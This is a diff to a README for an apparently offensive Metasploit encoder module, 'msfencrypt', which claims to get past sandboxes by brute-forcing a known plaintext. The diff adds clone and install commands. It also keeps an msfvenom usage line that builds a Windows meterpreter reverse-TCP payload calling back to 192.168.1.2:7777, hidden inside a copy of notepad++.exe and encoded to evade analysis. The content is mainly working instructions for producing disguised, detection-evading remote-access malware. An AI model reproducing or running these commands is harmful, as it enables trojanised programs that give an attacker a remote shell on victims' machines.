@@ -9,10 +9,16 @@ It use a brute force attack on a known plain text to bypass the sandbox.
 # Installation
 -----------
 
+      git clone https://github.com/MrMugiwara/Metasploit-Encryption.git
+
+      cd Metasploit-Encryption
+
 Copy msfencrypt.rb in metasploit/modules/encoders/x86/
+
+      cp msfencrypt.rb /opt/metasploit-framework/modules/encoders/x86/
 
 # Usage
 -----------
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=7777 -f raw -x notepad++.exe -f exe-only -e x86/msfencrypt -o output.exe
+      msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=7777 -f raw -x notepad++.exe -f exe-only -e x86/msfencrypt -o output.exe
 
